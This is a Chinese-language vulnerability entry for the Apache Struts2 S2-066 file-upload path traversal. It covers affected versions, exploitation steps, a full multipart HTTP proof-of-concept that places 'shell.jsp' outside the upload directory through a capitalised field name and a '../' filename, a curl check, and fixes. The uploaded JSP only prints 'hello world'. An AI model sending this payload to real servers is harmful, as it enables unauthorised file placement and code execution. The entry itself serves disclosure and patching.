## 漏洞描述

Apache Struts2 S2-066 是一个存在于文件上传功能中的路径穿越漏洞。攻击者可以通过操纵表单字段名称的大小写，将文件上传到预期上传目录之外的位置。Apache Struts2 在文件上传处理过程中通常只保留上传文件的基本名称（basename）以防止路径穿越，但是由于处理过程中的一个逻辑缺陷，攻击者可以通过首字母大写的表单字段名和包含路径穿越文件名的单独表单字段来绕过保护。

## 影响版本

- Apache Struts 2.0.0 - 2.5.30

## 前置条件

- 无需认证
- 目标应用有文件上传功能

## 利用步骤

1. 上传 JSP 文件被限制在上传目录
2. 使用大小写敏感性绕过保护
3. 上传文件到任意目录

## Payload

```http
POST /index.action HTTP/1.1
Host: target:8080
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl6ZFZPznNSPZOFJF

------WebKitFormBoundaryl6ZFZPznNSPZOFJF
Content-Disposition: form-data; name="File"; filename="shell.jsp"

<%
  out.println("hello world");
%>
------WebKitFormBoundaryl6ZFZPznNSPZOFJF
Content-Disposition: form-data; name="fileFileName"

../shell.jsp
------WebKitFormBoundaryl6ZFZPznNSPZOFJF--
```

## 验证方法

```bash
# 检查 shell.jsp 是否上传到 webapps/ROOT 目录
curl -s http://target:8080/shell.jsp
```

## 修复建议

1. 升级 Apache Struts 至 2.5.31+
2. 对上传文件名进行严格验证
3. 禁止路径穿越字符
